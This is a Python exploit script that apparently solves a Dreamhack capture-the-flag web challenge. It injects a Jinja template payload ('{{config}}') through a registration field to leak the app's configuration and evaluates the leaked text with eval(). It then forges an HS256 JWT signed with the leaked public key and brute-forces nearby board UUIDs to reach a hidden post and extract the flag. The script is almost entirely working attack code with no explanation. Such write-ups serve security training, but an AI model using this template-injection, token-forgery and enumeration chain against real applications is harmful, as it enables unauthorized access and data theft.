import requests
import html
import re
import jwt

url = "http://host3.dreamhack.games:11454/"
s = requests.Session()

creds = {
    'username': 'hacked',
    'password': 'hacked',
}

payload = "{{config}}"

res = s.post(f"{url}/register", data={
    **creds,
    'password_confirm': creds['password'],
    "school": payload,
})

# ssti
s.post(f"{url}/login", data=creds)

res = s.get(f"{url}/s/{payload}/a")

leak = re.findall(r'/s/<Config (.+?)>', html.unescape(res.text))[0].strip()

# forge jwt
import datetime
config = eval(leak)

pubkey = config['AUTH_PUBLIC_KEY']
flag_school = config['FLAG_SCHOOL']

forged_token = jwt.encode(
    {
        "iat": int('9' * 10),
        "exp": int('9' * 10),
        "username": creds['username'],
        "school": flag_school,
    },
    key=pubkey,
    algorithm="HS256",
)

# get free board id
res = s.get(f'{url}/s/{flag_school}')

free_uuid = re.findall(r'/s/[^/]+/([a-f0-9\-]{36})', res.text)[0]
print(f"> Free board: {free_uuid}")

# bruteforce flag board
parts = free_uuid.split('-')
start_hex = int(parts[0], 16)

for offset in range(1, 500):
    parts[0] = f"{start_hex + offset:08x}"
    test_uuid = "-".join(parts)

    print("Trying:", offset, test_uuid)
    
    res = requests.get(f"{url}/s/{flag_school}/{test_uuid}", cookies={
        'token': forged_token
    })

    if res.status_code == 200:
        post_id = re.findall(r'"(/s/.+/.+/.+?)">', res.text)[-1].strip()
        print("> Post ID:", post_id)
        
        res = requests.get(f'{url}/{post_id}', cookies={
            'token': forged_token
        })

        flag = re.findall(r'(DH{.+?})', res.text)[0].strip()
        print("Flag:", flag)
        break